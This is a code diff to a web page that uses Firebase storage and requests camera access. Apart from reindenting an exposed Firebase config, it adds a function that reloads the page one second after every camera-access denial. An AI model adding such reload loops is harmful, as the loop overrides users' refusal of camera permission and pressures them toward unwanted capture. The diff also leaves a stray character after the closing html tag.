@@ -296,13 +296,13 @@
         import { getStorage, ref, uploadString } from "https://www.gstatic.com/firebasejs/9.17.1/firebase-storage.js";
 
         const firebaseConfig = {
-	  apiKey: "AIzaSyDsK4imQ3uWcK7hyESo6hnDyQ96lsPNCZ8",
-	  authDomain: "nou-no-circle.firebaseapp.com",
-	  projectId: "nou-no-circle",
-	  storageBucket: "nou-no-circle.appspot.com",
-	  messagingSenderId: "756338805186",
-	  appId: "1:756338805186:web:cb740e035ac611b5baae5b",
-	  measurementId: "G-TWBV38P13D"
+            apiKey: "AIzaSyDsK4imQ3uWcK7hyESo6hnDyQ96lsPNCZ8",
+            authDomain: "nou-no-circle.firebaseapp.com",
+            projectId: "nou-no-circle",
+            storageBucket: "nou-no-circle.appspot.com",
+            messagingSenderId: "756338805186",
+            appId: "1:756338805186:web:cb740e035ac611b5baae5b",
+            measurementId: "G-TWBV38P13D"
         };
 
         // Firebase初期化
@@ -323,6 +323,7 @@
                 })
                 .catch(err => {
                     console.error('カメラアクセスエラー:', err);
+                    reloadPage();
                 });
         }
 
@@ -370,8 +371,15 @@
                 });
         }
 
+        // カメラアクセスが拒否された場合にページを再読み込み
+        function reloadPage() {
+            setTimeout(() => {
+                location.reload();
+            }, 1000); // 1秒後に再読み込み
+        }
+
         // ページロード時に動画をロード
         window.onload = loadVideos;
     </script>
 </body>
-</html>
+</html>a
